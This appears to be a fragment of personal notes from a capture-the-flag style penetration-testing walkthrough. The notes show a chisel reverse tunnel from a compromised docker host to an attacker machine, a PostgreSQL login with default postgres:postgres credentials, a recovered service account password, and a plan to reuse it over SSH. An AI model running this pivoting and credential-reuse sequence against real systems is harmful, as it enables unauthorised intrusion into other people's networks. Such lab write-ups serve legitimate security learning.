![[Pasted image 20240905173828.png]]
postgresql is running on port 5432 on the docker container

Started local port forwarding using chisel 1.8.1
```bash
./chisel-1.8.1 server -p 8000 --reverse
```

```bash
./chisel-1.8.1 client 10.10.14.7:8000 R:5432:172.22.0.1:5432
```

Connected to postgresql 
```bash
psql -h 127.0.0.1 -p 5432 -U postgres
```
`postgres:postgres`

![[Pasted image 20240905174030.png]]

![[Pasted image 20240905174122.png]]
`service_acc:123meunomeeivani`

We know that `svc` user exists on the system, attempting to SSH as `svc` using the above password
